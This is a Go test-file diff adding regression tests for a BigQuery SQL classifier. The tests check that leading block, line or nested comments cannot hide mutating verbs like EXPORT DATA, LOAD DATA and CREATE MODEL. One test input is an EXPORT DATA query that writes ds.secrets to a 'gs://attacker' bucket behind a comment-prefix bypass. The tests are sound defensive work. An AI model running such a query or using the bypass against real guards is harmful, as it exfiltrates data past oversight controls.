@@ -150,6 +150,45 @@ func TestBigQuery_Garbage(t *testing.T) {
 	assert.NotEmpty(t, ps.ParseErrors)
 }
 
+// CRIT-D8-02 regression — comment-prefix bypass on BigQuery-specific
+// verbs. AUDIT-WB-DSLICES-1-8.md §CRIT-D8-02 has the full reproduction:
+// a `/* */ EXPORT DATA ...` would fall through to xwb1989 (which doesn't
+// model EXPORT DATA) and get classified as StmtUnparseable instead of
+// triggering the EXPORT-DATA mutating-node-type rule.
+
+func TestBigQuery_ExportData_BlockCommentPrefix(t *testing.T) {
+	ps := bqParse(`/* */ EXPORT DATA OPTIONS(uri='gs://attacker/foo') AS SELECT * FROM ds.secrets`)
+	assert.Equal(t, StmtCopy, ps.StatementType,
+		"leading /* */ block comment MUST NOT hide EXPORT DATA from the prefix check")
+	assert.True(t, ps.IsDML)
+	assert.True(t, ps.HasMutatingNode)
+	assert.Equal(t, bigqueryMutatingExportData, ps.MutatingNodeType)
+}
+
+func TestBigQuery_LoadData_LineCommentPrefix(t *testing.T) {
+	ps := bqParse("-- attacker injected\nLOAD DATA INTO ds.x FROM FILES(uris=['gs://b/*.csv'], format='CSV')")
+	assert.Equal(t, StmtLoad, ps.StatementType,
+		"leading -- comment MUST NOT hide LOAD DATA from the prefix check")
+	assert.True(t, ps.HasMutatingNode)
+	assert.Equal(t, bigqueryMutatingLoadData, ps.MutatingNodeType)
+}
+
+func TestBigQuery_CreateModel_NestedBlockCommentPrefix(t *testing.T) {
+	ps := bqParse(`/*outer /*inner*/ outer*/ CREATE MODEL ds.evade OPTIONS(model_type='logistic_reg') AS SELECT * FROM ds.t`)
+	assert.Equal(t, StmtDDL, ps.StatementType,
+		"nested block comments MUST be stripped fully before the CREATE MODEL prefix check")
+	assert.True(t, ps.HasMutatingNode)
+	assert.Equal(t, bigqueryMutatingCreateModel, ps.MutatingNodeType)
+}
+
+func TestBigQuery_LiteralLooksLikeCommentNotStripped(t *testing.T) {
+	// String literal containing comment-shaped markers MUST stay a
+	// literal — and the SELECT classification MUST be preserved.
+	ps := bqParse(`SELECT '/* not a comment */ EXPORT DATA' FROM ds.t`)
+	assert.Equal(t, StmtSelect, ps.StatementType,
+		"comment markers inside a string literal MUST NOT trigger any extension prefix")
+}
+
 // Dialect-level smoke: dispatcher routes "bigquery" through parseBigQuery
 // rather than the fallthrough error path.
 func TestBigQuery_DispatcherRoutes(t *testing.T) {
